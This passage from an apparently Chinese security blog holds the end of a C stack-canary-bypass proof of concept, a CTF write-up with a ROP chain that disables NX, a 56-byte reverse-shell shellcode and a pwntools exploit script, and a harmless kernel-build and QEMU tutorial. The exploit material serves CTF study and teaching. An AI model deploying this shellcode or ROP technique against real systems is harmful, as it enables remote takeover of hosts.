class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">84</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">76</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(poc+<span class="number">64</span>,canary,<span class="number">4</span>);<span class="comment">//set canary</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]payload:%sn"</span>,poc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    <span class="comment">//init tf struct;</span></span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,<span class="number">76</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/关闭nx与反弹shell/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
在本題中明顯提供解題者一個stack buffer overflow的漏洞，
但因為程式有NX保護，必須使用ROP來控制程式行為。
在寫入的第12byte後開始覆蓋main的return address，
共計有88 bytes的overflow空間。
在程式read完以後便切斷該程式對client的連線，
即使拿到shell也無法操控該shell。
</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
但如果全部只使用ROP最多只能放入22個gadgets
（包括argument與padding等等）。
所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
接著便可以shellcode來產生一個reverse shell。
</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
將__libc_stack_end的address放入eax中。
调用_dl_make_stack_executable。
解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。

放入reverse shell的shellcode
建立reverse shell須執行socket、dup2、connect、execve等指令，
由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：

想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
若能應用當時程式的某些state便可減少一點size。
由於fd中0、1、2皆已被close，
拿到的socket fd即已為0，因此只需進行一次dup2。
由於ebp可控（ebp的值會等於input中的第8~11 byte），
由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
push port時使用ax中已有的數值（0x66），
port（big endian）將被固定為0x6600（26112）。
</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/内核编译/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/内核编译/">内核编译</a></h1>
  

    </header>
    <div class="entry">
      
        <p>原文muhe，有些地方有改动</p>
<h1 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01: 环境说明"></a>0x01: 环境说明</h1><p>ubuntu 14.04 x86<br>qemu<br>使用的内核版本2.6.32.1</p>
<p>busybox版本1.19.4</p>
<p>使用busybox是因为文件添加方便.</p>
<h1 id="0x02-内核编译并测试"><a href="#0x02-内核编译并测试" class="headerlink" title="0x02: 内核编译并测试"></a>0x02: 内核编译并测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.1.tar.gz -O linux-2.6.32.1.tar.gz</span><br><span class="line">$ tar -xvf linux-2.6.32.1.tar.gz</span><br></pre></td></tr></table></figure>
<p>首先要安装一些依赖库以及qemu。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">make bzImage </span><br><span class="line">$ make modules</span><br><span class="line">64位安32位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">make ARCH=i386 menuconfig   </span><br><span class="line">make ARCH=i386   </span><br><span class="line">make ARCH=i386 modules_install   </span><br><span class="line">make ARCH=i386 install</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03-增加syscall"><a href="#0x03-增加syscall" class="headerlink" title="0x03:增加syscall"></a>0x03:增加syscall</h1><p>增加syscall的方式和之前文章写的差不多，<br>只是这次内核版本更低，所以更简单一点。我这里添加了两个系统调用进去。</p>
<h2 id="1-在syscall-table中添加信息"><a href="#1-在syscall-table中添加信息" class="headerlink" title="1. 在syscall table中添加信息"></a>1. 在syscall table中添加信息</h2><p>文件 arch/x86/kernel/syscall_table_32.S中添加自己的调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.long sys_muhe_test</span><br><span class="line">.long sys_hello</span><br></pre></td></tr></table></figure>
<h2 id="2-定义syscall的宏"><a href="#2-定义syscall的宏" class="headerlink" title="2. 定义syscall的宏"></a>2. 定义syscall的宏</h2><p>文件arch/x86/include/asm/unistd_32.h中添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_hello 337</span><br><span class="line">#define __NR_muhe_test    338</span><br><span class="line">#ifdef __KERNEL__</span><br><span class="line">#define NR_syscalls 339</span><br></pre></td></tr></table></figure>
<p>要注意NR_syscalls要修改成现有的调用数目，<br>比如原来有0~336一共337个调用，<br>现在增加了两个，那就改成339。</p>
<h2 id="3-添加函数定义"><a href="#3-添加函数定义" class="headerlink" title="3. 添加函数定义"></a>3. 添加函数定义</h2><p>文件include/linux/syscalls.h</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long sys_muhe_test(int arg0);</span><br><span class="line">asmlinkage long sys_hello(void);</span><br></pre></td></tr></table></figure>
<h2 id="4-编写syscall代码"><a href="#4-编写syscall代码" class="headerlink" title="4. 编写syscall代码"></a>4. 编写syscall代码</h2><p>新建目录放自定义syscall的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:06] </span><br><span class="line">$ cat muhe_test.c</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_muhe_test</span><span class="params">(<span class="keyword">int</span> arg0)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"I am syscall"</span>);</span><br><span class="line">    printk(<span class="string">"syscall arg %d"</span>,arg0);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">long</span>)arg0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"hello my kernel worldn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:12] </span><br><span class="line">$ cat Makefile</span><br><span class="line">obj-y := muhe_test.o</span><br></pre></td></tr></table></figure>
<h2 id="5-修改Makefile"><a href="#5-修改Makefile" class="headerlink" title="5. 修改Makefile"></a>5. 修改Makefile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:44:59] </span><br><span class="line">$ cat Makefile| grep muhe</span><br><span class="line">core-y        += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ muhe_test/</span><br></pre></td></tr></table></figure>
<h2 id="6-编译"><a href="#6-编译" class="headerlink" title="6. 编译"></a>6. 编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j2</span><br></pre></td></tr></table></figure>
<h1 id="0x04-busybox编译配置"><a href="#0x04-busybox编译配置" class="headerlink" title="0x04: busybox编译配置"></a>0x04: busybox编译配置</h1><p>下载 busybox-1.20.1.tar.bz2:</p>
<p>wget   <a href="http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2" target="_blank" rel="noopener">http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2</a></p>
<p>编译</p>
<p>busybox用常规中的二进制编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<p>编译完成之后如下配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#将 proc 文件系统挂载到 /proc 目录中</span><br><span class="line">mount -t proc none /proc/</span><br><span class="line">#用于对内存控制与对驱动操作</span><br><span class="line">#将 sys 文件系统挂载到 /sys 的目录上</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">#mdev 是 busybox 自带的一个 udev ，它是用于系统启动和</span><br><span class="line">#热插拔或是动态加载驱动程序的时候，而自动产生设别节点的，</span><br><span class="line">#这句话如果不加上的话，这需要手动的 mknod 来挂载设备节点</span><br><span class="line">/sbin/mdev -s</span><br></pre></td></tr></table></figure>
<p>nano /etc/init</p>
<p>实际只要examples/inittab注释掉一些tty2::askfirst:-/bin/sh类似的行就可以了，因为我们只要一个控制台就可以了，文件内容只如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"></span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line"></span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line"></span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line"></span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir dev</span><br><span class="line">sudo mknod dev/ttyAMA0 c 204 64</span><br><span class="line">sudo mknod dev/null c 1 3</span><br><span class="line">sudo mknod dev/console c 5 1</span><br><span class="line">$ find . | cpio -o --format=newc &gt; ./rootfs.img</span><br><span class="line">gzip -c rootfs.img &gt; rootfs.img.gz</span><br><span class="line"> </span><br><span class="line">$ qemu-system-i386 -kernel bzImage -initrd rootfs.img.gz -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p0.qhimg.com/t016ecb6e221f21933d.png</span><br></pre></td></tr></table></figure>
<p>0x05: 测试系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:45:04] </span><br><span class="line">$ cd muhe_test_syscall_lib </span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:48] </span><br><span class="line">$ cat muhe_test_syscall_lib.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;linux/unistd.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;n Diving to kernel levelnn&quot;);</span><br><span class="line">        syscall(337,1337);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:51] </span><br><span class="line">$ gcc muhe_test_syscall_lib.c -o muhe -static</span><br></pre></td></tr></table></figure>
<p>一定要静态链接，因为你进busybox链接库那些是没有的。<br>这里要注意，每次拷贝新文件到busybox的文件系统中去，<br>都要执行find . | cpio -o –format=newc &gt; ../rootfs.img去生成新的rootfs。</p>
<p>然后qemu起系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:53:33] </span><br><span class="line">$  qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../busybox-1.19.4/rootfs.img -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p2.qhimg.com/t019e8e38063f5ebdac.png</span><br></pre></td></tr></table></figure>
<p>制作initrd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[cpp] view plain copy</span><br><span class="line"><span class="comment">/*hello.c*/</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">　　<span class="comment">/*强制刷新输出，不然可能打印不出来*/</span>  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>initrd吧，全称是initial ramdisk,在内核启动的时候会先去加载的一种文件系统．</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[plain] view plain copy</span><br><span class="line">$    cd ..  </span><br><span class="line">#    使用静态编译链接．  </span><br><span class="line">$    gcc -static -o helloworld hello.c  </span><br><span class="line">#    将helloworld制作成cpio  </span><br><span class="line">$    echo helloworld | cpio -o --format=newc &gt; rootfs  </span><br><span class="line">1776 blocks  </span><br><span class="line">$    ls -la rootfs   </span><br><span class="line">-rw-rw-r-- 1 seijia seijia 909312 12月 21 13:15 rootfs  </span><br><span class="line">#　使用qemu进行启动  </span><br><span class="line">$    qemu-system-x86_64   \  </span><br><span class="line">     -kernel ./bzImage \  </span><br><span class="line">     -initrd ./rootfs  \  </span><br><span class="line">     -append &quot;root=/dev/ram rdinit=/helloworld&quot;</span><br></pre></td></tr></table></figure>
<pre><code>qemu的-kernel 和-initrd能够绕过bootload直接
对指定的kernel和ramdisk进行加载．
用-append进行额外的选项配置，
在这里我们把根目录直接设置成内存，
启动的init程序设置成放进去的helloworld．
用来检测是否编译成功能输出helloworld
</code></pre><h1 id="内核编译遇到的问题"><a href="#内核编译遇到的问题" class="headerlink" title="内核编译遇到的问题"></a>内核编译遇到的问题</h1><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 